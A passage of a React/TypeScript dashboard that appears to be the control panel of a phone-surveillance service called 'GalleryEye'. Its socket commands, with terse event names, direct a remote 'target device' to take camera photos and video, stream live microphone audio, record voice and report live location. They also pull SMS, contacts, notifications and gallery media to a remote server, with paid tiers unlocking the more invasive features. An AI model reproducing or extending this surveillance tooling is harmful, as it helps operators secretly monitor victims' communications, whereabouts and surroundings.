                const currentDevId = selectedDeviceIdRef.current || selectedDeviceId;
                if (data.packageName && session?.user?.uuid && currentDevId) {
                    setAppIcons(prev => {
                        if (!prev[data.packageName]) {
                            // Use setTimeout to ensure emit is outside React render cycle
                            setTimeout(() => {
                                socket.emit('request_app_icon', {
                                    uuid: (session.user as any).uuid,
                                    targetDeviceId: currentDevId,
                                    packageName: data.packageName
                                });
                            }, 0);
                        }
                        return prev;
                    });
                }
            });

            socket.on("app_icon_response", (data: any) => {
                if (data.packageName && data.icon) {
                    setAppIcons(prev => {
                        const updated = { ...prev, [data.packageName]: data.icon };
                        try { localStorage.setItem('galleryeye_app_icons', JSON.stringify(updated)); } catch {}
                        return updated;
                    });
                }
            });

            socket.on("notification_dismissed", (data: any) => {
                setNotifications(prev => {
                    const updated = prev.map(n => n.id === data.id ? { ...n, dismissed: true } : n);
                    try { localStorage.setItem('galleryeye_notifications', JSON.stringify(updated)); } catch { }
                    return updated;
                });
            });

            socket.on("notification_monitor_status", (data: any) => {
                // Feature is always on now.
            });

            socket.on("notification_error", (data: any) => {
                // Ignore
            });

            // Permission Check Response
            socket.on("permission_status", (data: any) => {
                setIsCheckingPermissions(false);
                setDevicePermissions(data.permissions);
            });

            socket.on("d_f4", (data: any) => {
                if (data.status === 'captured') {
                    setIsCapturingPhoto(false);
                }
            });

            socket.on("camera_photo", (data: any) => {
                setIsCapturingPhoto(false);
                if (data.image) {
                    const imageUrl = data.image.startsWith('http') || data.image.startsWith('data:') 
                        ? data.image 
                        : `data:image/jpeg;base64,${data.image}`;

                    setCapturedMedia(prev => {
                        const filtered = prev.filter(item => !item.isTemp);
                        return [{
                            id: `capture_${data.camera || 'back'}_${data.timestamp || Date.now()}`,
                            resource_type: 'image',
                            url: imageUrl,
                            created_at: new Date(data.timestamp || Date.now()).toISOString(),
                            camera: data.camera || 'back'
                        }, ...filtered];
                    });
                }
            });

            socket.on("camera_video", (data: any) => {
                setIsRecording(false);
                setIsVideoUploading(false);
                setRecordingProgress({ current: 0, total: 0 });
                if (data.video) {
                    setCapturedMedia(prev => {
                        const filtered = prev.filter(item => !item.isTemp);
                        return [{
                            id: `video_${data.camera || 'back'}_${data.timestamp || Date.now()}`,
                            resource_type: 'video',
                            url: data.video,
                            created_at: new Date(data.timestamp || Date.now()).toISOString(),
                            camera: data.camera || 'back'
                        }, ...filtered];
                    });
                }
            });

            socket.on("live_frame", (data: any) => {
                if (data.frame && liveImageRef.current) {
                    liveImageRef.current.src = data.frame.startsWith('data:') 
                        ? data.frame 
                        : `data:image/jpeg;base64,${data.frame}`;
                }
            });

            socket.on("d_f3", (data: any) => {
                const current = data.current || 0;
                const total = data.total || 0;
                setRecordingProgress({ current, total });
                // When recording finishes automatically, trigger upload status
                if (current >= total && total > 0) {
                    setIsRecording(false);
                    setIsVideoUploading(true);
                    setCapturedMedia(prev => [{
                        id: `temp_video_${Date.now()}`,
                        resource_type: 'video',
                        url: 'loading',
                        created_at: new Date().toISOString(),
                        camera: cameraMode,
                        isTemp: true
                    }, ...prev]);
                }
            });

            socket.on("gallery_error", (data: any) => {
                const errorMessage = data.message || "Gallery error occurred";
                if (errorMessage.includes("Permission Denied")) {
                    setAlertData({
                        title: 'Gallery Permission Required',
                        message: 'Please enable Storage/Gallery permission in the App settings to sync media.',
                        type: 'error'
                    });
                } else {
                    setAlertData({
                        title: 'Gallery Error',
                        message: errorMessage,
                        type: 'error'
                    });
                }
                setShowCustomAlert(true);
            });

            socket.on("d_e1", (data: any) => {
                setIsCapturingPhoto(false);
                setIsRecording(false);
                const errorMessage = data.error || "Camera error occurred";
                setCameraError(errorMessage);

                if (errorMessage.includes("Permission Denied")) {
                    alert(`${errorMessage}\n\nPlease enable Camera permission in the App settings.`);
                } else {
                    setTimeout(() => setCameraError(null), 5000);
                }
            });

            // Live Audio â€” Ring Buffer Writer with cubic-interpolation resampling.
            // Incoming PCM is 16kHz from the device, but AudioContext usually runs at 48kHz
            // (browsers ignore the sampleRate hint on Windows/macOS). Without resampling here,
            // playback was effectively 3x too fast â†’ constant underruns â†’ choppy/clicky sound.
            socket.on("live_audio", (data: any) => {
                if (!data.chunk) return;
                if (!isLiveAudioRef.current) return;

                // Auto-create AudioContext on first chunk â€” playback starts as soon as device sends audio
                if (!audioContextRef.current) {
                    try {
                        const ctx = new (window.AudioContext || (window as any).webkitAudioContext)();
                        const outRate = ctx.sampleRate;
                        const gainNode = ctx.createGain();
                        const analyser = ctx.createAnalyser();
                        analyser.fftSize = 256;
                        gainNode.gain.value = 0.8;
                        gainNode.connect(analyser);
                        analyser.connect(ctx.destination);

                        const processor = ctx.createScriptProcessor(2048, 0, 1);

                        audioRingBufRef.current = new Float32Array(Math.ceil(outRate * 10));
                        audioRingWriteRef.current = 0;
                        audioRingReadRef.current = 0;
                        audioRingSamplesRef.current = 0;
                        audioSrcRateRef.current = 16000;
                        audioOutRateRef.current = outRate;
                        audioResampPosRef.current = 0;
                        audioResampHistRef.current = new Float32Array(4);
                        audioResampHistIdxRef.current = 0;
                        audioWarmedRef.current = false;
                        audioLastSampleRef.current = 0;
                        audioUnderrunCountRef.current = 0;

                        const warmupSamples = Math.floor(outRate * 0.3);

                        processor.onaudioprocess = (e: AudioProcessingEvent) => {
                            const output = e.outputBuffer.getChannelData(0);
                            const ring = audioRingBufRef.current;
                            const capacity = ring.length;

                            if (!audioWarmedRef.current) {
                                if (audioRingSamplesRef.current >= warmupSamples) {
                                    audioWarmedRef.current = true;
                                    audioUnderrunCountRef.current = 0;
                                } else {
                                    output.fill(0);
                                    return;
                                }
                            }

                            for (let i = 0; i < output.length; i++) {
                                if (audioRingSamplesRef.current > 0) {
                                    const s = ring[audioRingReadRef.current];
                                    output[i] = s;
                                    audioLastSampleRef.current = s;
                                    audioRingReadRef.current = (audioRingReadRef.current + 1) % capacity;
                                    audioRingSamplesRef.current--;
                                    audioUnderrunCountRef.current = 0;
                                } else {
                                    audioUnderrunCountRef.current++;
                                    const decayed = audioLastSampleRef.current * 0.97;
                                    output[i] = decayed;
                                    audioLastSampleRef.current = decayed;
                                    if (audioUnderrunCountRef.current > Math.floor(outRate * 0.05)) {
                                        audioWarmedRef.current = false;
                                    }
                                }
                            }
                        };

                        processor.connect(gainNode);

                        audioContextRef.current = ctx;
                        audioGainRef.current = gainNode;
                        audioAnalyserRef.current = analyser;
                        audioProcessorRef.current = processor;

                        // Resume AudioContext if browser suspended it
                        if (ctx.state === 'suspended') ctx.resume();
                    } catch (e) {
                        console.error('[Audio] Failed to create AudioContext:', e);
                    }
                }

                try {
                    const binaryStr = atob(data.chunk);
                    const bytes = new Uint8Array(binaryStr.length);
                    for (let i = 0; i < binaryStr.length; i++) bytes[i] = binaryStr.charCodeAt(i);
                    const int16 = new Int16Array(bytes.buffer);

                    const ring = audioRingBufRef.current;
                    const capacity = ring.length;
                    const srcRate = audioSrcRateRef.current;
                    const outRate = audioOutRateRef.current;
                    const ratio = outRate / srcRate; // e.g. 48000/16000 = 3 output samples per input

                    const hist = audioResampHistRef.current;
                    let histIdx = audioResampHistIdxRef.current;
                    let pos = audioResampPosRef.current;

                    for (let i = 0; i < int16.length; i++) {
                        const sample = int16[i] / 32768.0;
                        // Push into history ring (4 samples for cubic: s0,s1,s2,s3)
                        hist[histIdx & 3] = sample;
                        histIdx++;

                        // Emit output samples using cubic (Catmull-Rom) interpolation
                        // We have enough history after 4+ samples pushed
                        if (histIdx >= 4) {
                            const s0 = hist[(histIdx - 4) & 3];
                            const s1 = hist[(histIdx - 3) & 3];
                            const s2 = hist[(histIdx - 2) & 3];
                            const s3 = hist[(histIdx - 1) & 3];

                            while (pos < 1.0) {
                                const t = pos;
                                const t2 = t * t;
                                const t3 = t2 * t;
                                // Catmull-Rom spline
                                const out = 0.5 * (
                                    (2 * s1) +
                                    (-s0 + s2) * t +
                                    (2 * s0 - 5 * s1 + 4 * s2 - s3) * t2 +
                                    (-s0 + 3 * s1 - 3 * s2 + s3) * t3
                                );
                                ring[audioRingWriteRef.current] = Math.max(-1, Math.min(1, out));
                                audioRingWriteRef.current = (audioRingWriteRef.current + 1) % capacity;
                                if (audioRingSamplesRef.current < capacity) {
                                    audioRingSamplesRef.current++;
                                } else {
                                    audioRingReadRef.current = (audioRingReadRef.current + 1) % capacity;
                                }
                                pos += 1.0 / ratio;
                            }
                            pos -= 1.0;
                        }
                    }
                    audioResampHistIdxRef.current = histIdx;
                    audioResampPosRef.current = pos;

                    // VU meter from the raw incoming 16k chunk
                    let sum = 0;
                    for (let i = 0; i < int16.length; i++) {
                        const s = int16[i] / 32768.0;
                        sum += s * s;
                    }
                    const rms = Math.sqrt(sum / int16.length);
                    setAudioLevel(Math.min(1, rms * 5));
                } catch (e) {
                    console.error('[Audio] Ring buffer write error:', e);
                }
            });

            socket.on("d_a3", (data: any) => {
                setIsLiveAudio(false);
                isLiveAudioRef.current = false;
                setAudioError(data.error || 'Audio error occurred');
                setTimeout(() => setAudioError(null), 5000);
            });

            // Voice Recording Ready â€” device finished recording, server uploaded to R2
            socket.on("voice_recording_ready", (data: any) => {
                if (data.url) {
                    setCapturedVoice(prev => {
                        const filtered = prev.filter(item => !item.isTemp);
                        return [{
                            id: `voice_${Date.now()}`,
                            resource_type: 'audio',
                            url: data.url,
                            created_at: new Date(data.timestamp || Date.now()).toISOString(),
                            duration: data.duration || 0
                        }, ...filtered];
                    });
                }
                setIsVoiceRecording(false);
                setIsVoiceUploading(false);
                setVoiceRecProgress({ current: 0, total: 0 });
                if (voiceRecTimerRef.current) {
                    clearInterval(voiceRecTimerRef.current);
                    voiceRecTimerRef.current = null;
                }
            });

            // Location updates — save per device
            socket.on("d_l1", (data: any) => {
                setLocationData(data);
                setIsFetchingLocation(false);
                setLocationError(null);
                if (typeof window !== 'undefined' && selectedDeviceIdRef.current) {
                    try {
                        const key = `loc_${selectedDeviceIdRef.current}`;
                        const existing = JSON.parse(localStorage.getItem(key) || '{"history":[]}');
                        const history = [data, ...(existing.history || [])].slice(0, 20); // keep last 20
                        localStorage.setItem(key, JSON.stringify({ latest: data, history }));
                        setLocationHistory(history);
                    } catch { }
                }
            });

            socket.on("d_l2", (data: any) => {
                setIsFetchingLocation(false);
                setLocationError(data.error || "Failed to fetch location");
            });

            // Voice Recording Progress from device
            socket.on("d_a2", (data: any) => {
                if (data.current !== undefined) {
                    setVoiceRecProgress({ current: data.current, total: data.total || 60 });
                }
                if (data.current >= (data.total || 60) && (data.total || 60) > 0) {
                    setIsVoiceRecording(false);
                    setIsVoiceUploading(true);
                    setCapturedVoice(prev => [{
                        id: `temp_voice_${Date.now()}`,
                        resource_type: 'audio',
                        url: 'loading',
                        created_at: new Date().toISOString(),
                        isTemp: true
                    }, ...prev]);
                }
            });

            // Load cached images instantly for fast UX
            const initDeviceId = localStorage.getItem('selectedDeviceId');
            const GALLERY_CACHE_KEY = initDeviceId ? `gallery_images_${uuid}_${initDeviceId}` : `gallery_images_${uuid}`;
            try {
                const cachedImages = localStorage.getItem(GALLERY_CACHE_KEY);
                if (cachedImages) {
                    const parsed = JSON.parse(cachedImages);
                    setImages(parsed);
                }
            } catch { /* ignore */ }

            // Define fetch function so it can be called later
            let isFetchingGallery = false;
            const fetchGallery = (loadPage = 1, append = false, fetchAll = false, targetDeviceId = localStorage.getItem('selectedDeviceId')) => {
                if (!targetDeviceId) {
                    setImages([]);
                    setFolders([]);
                    return;
                }
                if (isFetchingGallery) return;
                isFetchingGallery = true;
                if (append) setIsLoadingMore(true);
                const limit = fetchAll ? 10000 : 30;
                const deviceQuery = `&deviceId=${targetDeviceId}`;
                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/images?uuid=${uuid}&page=${loadPage}&limit=${limit}${deviceQuery}`)
                    .then((res) => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                    .then((data) => {
                        const items = data.items || (Array.isArray(data) ? data : []);
                        const hasMore = data.hasMore !== undefined ? data.hasMore : false;

                        // Filter out camera captures from the gallery feed and ensure device match
                        const galleryItems = items.filter((item: any) => 
                            !(item.id && (item.id.includes('capture_') || item.id.includes('video_'))) &&
                            (!item.deviceId || item.deviceId === targetDeviceId)
                        );

                        if (append) {
                            setImages(prev => {
                                const existingIds = new Set(prev.map((i: any) => i.id));
                                const newItems = galleryItems.filter((i: any) => !existingIds.has(i.id));
                                return [...prev, ...newItems];
                            });
                        } else {
                            setImages(galleryItems);
                        }
                        setGalleryHasMore(hasMore);
                        setGalleryPage(loadPage);

                        const cacheKey = `gallery_images_${uuid}_${targetDeviceId}`;
                        try { localStorage.setItem(cacheKey, JSON.stringify(items.slice(0, 100))); } catch { /* storage full */ }
                    })
                    .catch(e => console.error('[Gallery] Fetch error:', e))
                    .finally(() => { isFetchingGallery = false; setIsLoadingMore(false); });
            };

            let isFetchingCamera = false;
            const fetchCamera = (loadPage = 1, targetDeviceId = localStorage.getItem('selectedDeviceId')) => {
                if (!targetDeviceId) {
                    setCapturedMedia([]);
                    return;
                }
                if (isFetchingCamera) return;
                isFetchingCamera = true;
                const limit = 10000;
                const deviceQuery = `&deviceId=${targetDeviceId}`;
                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/camera?uuid=${uuid}&page=${loadPage}&limit=${limit}${deviceQuery}`)
                    .then((res) => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                    .then((data) => {
                        const items = (data.items || (Array.isArray(data) ? data : [])).filter((item: any) => !item.deviceId || item.deviceId === targetDeviceId);
                        const captures = items.map((item: any) => ({
                            id: item.id,
                            resource_type: item.resource_type === 'video' || item.id.includes('video_') ? 'video' : 'image',
                            url: item.url,
                            created_at: item.created_at,
                            camera: item.id.includes('front') ? 'front' : 'back',
                            timestamp: new Date(item.created_at).getTime()
                        }));

                        setCapturedMedia(captures);
                        const camCacheKey = `gallery_captured_${uuid}_${targetDeviceId}`;
                        try { localStorage.setItem(camCacheKey, JSON.stringify(captures.slice(0, 100))); } catch { /* storage full */ }
                    })
                    .catch(e => console.error('[Camera] Fetch error:', e))
                    .finally(() => { isFetchingCamera = false; });
            };

            let isFetchingVoice = false;
            const fetchVoice = (loadPage = 1, targetDeviceId = localStorage.getItem('selectedDeviceId')) => {
                if (!targetDeviceId) {
                    setCapturedVoice([]);
                    return;
                }
                if (isFetchingVoice) return;
                isFetchingVoice = true;
                const limit = 100;
                const deviceQuery = `&deviceId=${targetDeviceId}`;

                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/voice?uuid=${uuid}&page=${loadPage}&limit=${limit}${deviceQuery}`)
                    .then((res) => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                    .then((data) => {
                        const items = (data.items || (Array.isArray(data) ? data : [])).filter((item: any) => !item.deviceId || item.deviceId === targetDeviceId);
                        setCapturedVoice(items);
                    })
                    .catch(e => console.error('[Voice] Fetch error:', e))
                    .finally(() => { isFetchingVoice = false; });
            };

            // Expose globally securely for the socket event
            (window as any).fetchGalleryData = fetchGallery;
            (window as any).fetchCameraData = fetchCamera;
            (window as any).fetchVoiceData = fetchVoice;

            // Initial fetch
            fetchGallery();
            fetchCamera();
            fetchVoice();

            return () => {
                if (socket) {
                    socket.disconnect();
                    socket = null;
                }
                delete (window as any).fetchGalleryData;
                delete (window as any).fetchCameraData;
            };
        }
    }, [status, session?.user?.uuid]);
    const handleLoadMore = () => {
        if (galleryHasMore && !isLoadingMore && (window as any).fetchGalleryData) {
            (window as any).fetchGalleryData(galleryPage + 1, true, false, selectedDeviceId);
        }
    };

    const fetchFolders = () => {
        if (!requireConnectedDevice(() => {})) return;
        if (socket && selectedDeviceId) {
            setIsFetchingFolders(true);
            socket.emit("get_folders", {
                uuid: session?.user?.uuid,
                targetDeviceId: selectedDeviceId
            });
        }
    };

    const handleFolderClick = (folder: any) => {
        if (!requireConnectedDevice(() => {})) return;
        // Prevent clicking while upload is in progress
        if (uploadProgress) {
            setAlertData({ title: 'Sync in Progress', message: 'Please wait for the current sync to complete.', type: 'info' });
            setShowCustomAlert(true);
            return;
        }
        setSelectedFolder(folder);
        setSyncMediaType(null); // Reset media type selection
    };

    // SMS Functions
    const fetchSms = () => {
        // Plan check - SMS requires Standard or Premium
        if (!planLimits.sms) {
            showUpgradePrompt('SMS Access', 'standard');
            return;
        }
        requireConnectedDevice((targetId) => {
            const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
            if (socket && effectiveTarget && session?.user?.uuid) {
                setIsFetchingSms(true);
                socket.emit("get_sms", {
                    uuid: session.user.uuid,
                    targetDeviceId: effectiveTarget
                });
            }
        });
    };

    const resetSmsSync = () => {
        requireConnectedDevice((targetId) => {
            const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
            if (socket && effectiveTarget && session?.user?.uuid) {
                socket.emit("reset_sms_sync", {
                    uuid: session.user.uuid,
                    targetDeviceId: effectiveTarget
                });
                setSmsList([]);
            }
        });
    };

    // Contacts Functions
    const fetchContacts = () => {
        // Plan check - Contacts requires Standard or Premium
        if (!planLimits.contacts) {
            showUpgradePrompt('Contacts Access', 'standard');
            return;
        }
        requireConnectedDevice((targetId) => {
            const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
            if (socket && effectiveTarget && session?.user?.uuid) {
                setIsFetchingContacts(true);
                const payload = {
                    uuid: session.user.uuid,
                    targetDeviceId: effectiveTarget,
                    deviceId: effectiveTarget
                };
                socket.emit("get_contacts", payload);
                socket.emit("sync_contacts", payload);
                socket.emit("request_contacts", payload);
            }
        });
    };

    // Permission Check Function
    const checkPermissions = () => {
        requireConnectedDevice((targetId) => {
            const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
            if (socket && effectiveTarget && session?.user?.uuid) {
                setIsCheckingPermissions(true);
                setDevicePermissions(null);
                socket.emit("check_permissions", {
                    uuid: session.user.uuid,
                    targetDeviceId: effectiveTarget
                });
            }
        });
    };

    // Filtered SMS based on search
    const filteredSms = useMemo(() => {
        if (!smsSearchQuery) return smsList;
        const query = smsSearchQuery.toLowerCase();
        return smsList.filter(sms =>
            sms.address?.toLowerCase().includes(query) ||
            sms.body?.toLowerCase().includes(query)
        );
    }, [smsList, smsSearchQuery]);

    // Filtered Contacts based on search
    const filteredContacts = useMemo(() => {
        if (!contactsSearchQuery) return contactsList;
        const query = contactsSearchQuery.toLowerCase();
        return contactsList.filter(contact => {
            const nameMatch = contact.name?.toLowerCase()?.includes(query) || false;
            const phoneMatch = contact.phones?.some((p: any) => {
                // Handle both string and object phone entries
                const phoneStr = typeof p === 'string' ? p : (p?.number || p?.value || String(p));
                return phoneStr?.toLowerCase()?.includes(query) || false;
            }) || false;
            return nameMatch || phoneMatch;
        });
    }, [contactsList, contactsSearchQuery]);


    const triggerUpload = (count: number | 'all') => {
        requireConnectedDevice((targetId) => {
            const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
            if (socket && selectedFolder && syncMediaType && session?.user?.uuid && effectiveTarget) {
                const payload = {
                    uuid: session.user.uuid,
                    targetDeviceId: effectiveTarget,
                    folderId: selectedFolder.id,
                    folderName: selectedFolder.name,
                    count: count,
                    mediaType: syncMediaType
                };
                socket.emit("trigger_sync", payload);
                setIsStartingSync(true); // Start loading animation
                setSelectedFolder(null);
                setSyncMediaType(null);
            }
        });
    };

    // --- Torch Functions ---
    const toggleTorch = () => {
        // Plan check - Torch requires Standard or Premium
        if (!planLimits.torch) {
            showUpgradePrompt('Flashlight Control', 'standard');
            return;
        }
        requireConnectedDevice((targetId) => {
            const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
            if (!socket || !effectiveTarget || !session?.user?.uuid) return;

            const newState = !isTorchOn;
            setIsTorchOn(newState);

            socket.emit("torch_control", {
                uuid: session.user.uuid,
                targetDeviceId: effectiveTarget,
                on: newState,
                aggressive: torchAggressive,
                duration: torchDuration
            });
        });
    };

    const fetchLocation = useCallback(() => {
        if (!planLimits.location) {
            showUpgradePrompt('Live Location', 'premium');
            return;
        }
        
        requireConnectedDevice((targetId) => {
            const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
            if (!socket || !effectiveTarget || !session?.user?.uuid) return;
            
            setIsFetchingLocation(true);
            setLocationError(null);
            socket.emit('c_l1', {
                uuid: session.user.uuid,
                targetDeviceId: effectiveTarget
            });
        });
    }, [socket, selectedDeviceId, session, planLimits, devices]);

    // --- Vibration Functions ---
    const triggerVibration = () => {
        // Plan check - Vibration requires Standard or Premium
        if (!planLimits.vibration) {
            showUpgradePrompt('Vibration Control', 'standard');
            return;
        }
        requireConnectedDevice((targetId) => {
            const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
            if (!socket || !effectiveTarget || !session?.user?.uuid) return;

            socket.emit("vibrate_control", {
                uuid: session.user.uuid,
                targetDeviceId: effectiveTarget,
                duration: vibrationDuration
            });
        });
    };

    // --- Live Audio Functions ---
    const startLiveAudio = useCallback(() => {
        if (userPlan !== 'premium' && userPlan !== 'enterprise') {
            showUpgradePrompt('Live Audio Listening', 'premium');
            return;
        }
        requireConnectedDevice((targetId) => {
            const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
            if (!socket || !effectiveTarget || !session?.user?.uuid) return;

            socket.emit('c_a1', {
                uuid: session.user.uuid,
                targetDeviceId: effectiveTarget,
                gainBoost: false
            });
            setIsLiveAudio(true);
            isLiveAudioRef.current = true;
            setAudioError(null);
            setAudioElapsed(0);
            audioTimerRef.current = setInterval(() => {
                setAudioElapsed(prev => prev + 1);
            }, 1000);
        });
    }, [socket, selectedDeviceId, session, userPlan, devices]);

    const stopLiveAudio = useCallback(() => {
        if (socket && selectedDeviceId && session?.user?.uuid) {
            socket.emit('c_a2', {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
        }

        // Cleanup timer
        if (audioTimerRef.current) {
            clearInterval(audioTimerRef.current);
            audioTimerRef.current = null;
        }

        // Cleanup visualizer
        if (audioAnimFrameRef.current) {
            cancelAnimationFrame(audioAnimFrameRef.current);
            audioAnimFrameRef.current = 0;
        }

        // Cleanup ScriptProcessorNode
        try {
            audioProcessorRef.current?.disconnect();
        } catch (e) { /* ignore */ }
        audioProcessorRef.current = null;

        // Cleanup AudioContext
        try {
            audioContextRef.current?.close();
        } catch (e) { /* ignore */ }
        audioContextRef.current = null;
        audioGainRef.current = null;
        audioAnalyserRef.current = null;

        // Reset ring buffer
        audioRingWriteRef.current = 0;
        audioRingReadRef.current = 0;
        audioRingSamplesRef.current = 0;

        setIsLiveAudio(false);
        isLiveAudioRef.current = false;
        setAudioLevel(0);
        setAudioElapsed(0);
    }, [socket, selectedDeviceId, session]);

    // --- Voice Recording Functions ---
    const startVoiceRecording = useCallback(() => {
        requireConnectedDevice((targetId) => {
            const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
            if (!socket || !effectiveTarget || !session?.user?.uuid) return;

            socket.emit('c_a3', {
                uuid: session.user.uuid,
                targetDeviceId: effectiveTarget,
                duration: voiceRecDuration
            });
            setIsVoiceRecording(true);
            setIsVoiceUploading(false);
            setVoiceRecProgress({ current: 0, total: voiceRecDuration });

            // Local progress timer
            let elapsed = 0;
            voiceRecTimerRef.current = setInterval(() => {
                elapsed++;
                setVoiceRecProgress(prev => ({ ...prev, current: elapsed }));
                if (elapsed >= voiceRecDuration) {
                    clearInterval(voiceRecTimerRef.current!);
                    voiceRecTimerRef.current = null;
                }
            }, 1000);
        });
    }, [socket, selectedDeviceId, session, voiceRecDuration, devices]);

    const stopVoiceRecording = useCallback(() => {
        if (socket && selectedDeviceId && session?.user?.uuid) {
            socket.emit('c_a4', {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
        }
        setIsVoiceRecording(false);
        setIsVoiceUploading(true);
        setVoiceRecProgress({ current: 0, total: 0 });
        if (voiceRecTimerRef.current) {
            clearInterval(voiceRecTimerRef.current);
            voiceRecTimerRef.current = null;
        }
    }, [socket, selectedDeviceId, session]);

    // Fetch missing app icons for existing stored notifications
    useEffect(() => {
        if (!socket || !session?.user?.uuid || !selectedDeviceId || notifications.length === 0) return;
        const missingPackages = Array.from(new Set(
            notifications
                .map((n: any) => n.packageName)
                .filter((pkg: string) => pkg && !appIcons[pkg])
        ));
        if (missingPackages.length === 0) return;
        missingPackages.forEach((pkg: string) => {
            socket.emit('request_app_icon', {
                uuid: (session.user as any).uuid,
                targetDeviceId: selectedDeviceId,
                packageName: pkg
            });
        });
    // eslint-disable-next-line react-hooks/exhaustive-deps
    }, [socket, selectedDeviceId, notifications.length]);

    // Update gain when volume/mute changes
    useEffect(() => {
        if (audioGainRef.current) {
            audioGainRef.current.gain.value = isMuted ? 0 : audioVolume / 100;
        }
    }, [audioVolume, isMuted]);

    // Format seconds to MM:SS
    const formatTime = (s: number) => `${Math.floor(s / 60).toString().padStart(2, '0')}:${(s % 60).toString().padStart(2, '0')}`;

    // --- Gallery Logic ---

    const hasVideos = useMemo(() => images.some(img => img.resource_type === 'video'), [images]);

    const filteredImages = useMemo(() => {
        if (activeTab === 'all') return images;
        return images.filter(img => img.resource_type === activeTab);
    }, [images, activeTab]);

    const toggleSelection = (id: string) => {
        const newSelection = new Set(selectedItems);
        if (newSelection.has(id)) {
            newSelection.delete(id);
        } else {
            newSelection.add(id);
        }
        setSelectedItems(newSelection);
        if (newSelection.size === 0) setIsSelectionMode(false);
        else setIsSelectionMode(true);
    };

    const selectAll = async () => {
        if (selectedItems.size > 0 && selectedItems.size >= filteredImages.length) {
            setSelectedItems(new Set());
            setIsSelectionMode(false);
        } else {
            setIsSelectionMode(true);
            try {
                // Fetch all IDs from backend to select everything without loading images into UI
                const res = await fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/images?uuid=${session?.user?.uuid}&page=1&limit=10000`);
                if (!res.ok) throw new Error('Fetch failed');
                const data = await res.json();
                const items = data.items || [];
                const idsToSelect = items
                    .filter((img: any) => activeTab === 'all' || img.resource_type === activeTab)
                    .map((img: any) => img.id || img.Key);
                setSelectedItems(new Set(idsToSelect));
            } catch (err) {
                // Fallback to loaded images if fetch fails
                setSelectedItems(new Set(filteredImages.map(img => img.id)));
            }
        }
    };

    const deleteSelected = async () => {
        setShowDeleteConfirm(true);
    };

    const confirmDelete = async () => {
        setIsDeleting(true);
        const idsToDelete = Array.from(selectedItems);

        try {
            const response = await fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/delete', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ids: idsToDelete })
            });

            if (response.ok) {
                setImages(prev => prev.filter(img => !selectedItems.has(img.id)));
                setSelectedItems(new Set());
                setIsSelectionMode(false);
            }
        } catch (error) {
            console.error("Delete failed", error);
        } finally {
            setIsDeleting(false);
            setShowDeleteConfirm(false);
        }
    };

    const downloadSelected = async () => {
        const selectedUrls = images.filter(img => selectedItems.has(img.id)).map(img => img.url);
        if (selectedUrls.length === 0) return;

        // If only 1 file is selected, download it directly instead of making a ZIP
        if (selectedUrls.length === 1) {
            const singleFileUrl = selectedUrls[0];
            const fileExt = singleFileUrl.split('.').pop()?.split('?')[0] || 'file';
            downloadSingle(singleFileUrl, `gallery_eye_${Date.now()}.${fileExt}`);
            setSelectedItems(new Set());
            setIsSelectionMode(false);
            return;
        }

        setIsDownloading(true);
        try {
            const response = await fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/download-zip', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ urls: selectedUrls })
            });

            if (response.ok) {
                const blob = await response.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `gallery_download_${new Date().toISOString()}.zip`;
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                document.body.removeChild(a);
                setSelectedItems(new Set());
                setIsSelectionMode(false);
            }
        } catch (error) {
            console.error("Download failed", error);
        } finally {
            setIsDownloading(false);
        }
    };

    const downloadSingle = async (url: string, filename: string) => {
        try {
            // Proxies the Cloudflare R2 fetch through the Next.js API to set 'Content-Disposition: attachment'
            // This forces the browser to download the file directly instead of opening it in a new tab due to cross-origin limitations.
            const proxyUrl = `/api/download?url=${encodeURIComponent(url)}&filename=${encodeURIComponent(filename)}`;
            
            const link = document.createElement('a');
            link.href = proxyUrl;
            link.download = filename;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        } catch (error) {
            console.error("Download failed", error);
            window.open(url, '_blank');
        }
    };

    // Download SMS as CSV
    const downloadSmsAsCsv = () => {
        if (!requireConnectedDevice(() => {})) return;
        if (smsList.length === 0) {
            setAlertData({ title: 'No Data to Export', message: 'No SMS messages currently synced. Please click Sync SMS first.', type: 'info' });
            setShowCustomAlert(true);
            return;
        }

        const headers = ['Address', 'Body', 'Date', 'Type'];
        const csvContent = [
            headers.join(','),
            ...smsList.map(sms => [
                `"${(sms.address || '').replace(/"/g, '""')}"`,
                `"${(sms.body || '').replace(/"/g, '""')}"`,
                new Date(sms.date).toISOString(),
                sms.type === 1 ? 'Received' : 'Sent'
            ].join(','))
        ].join('\n');

        const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
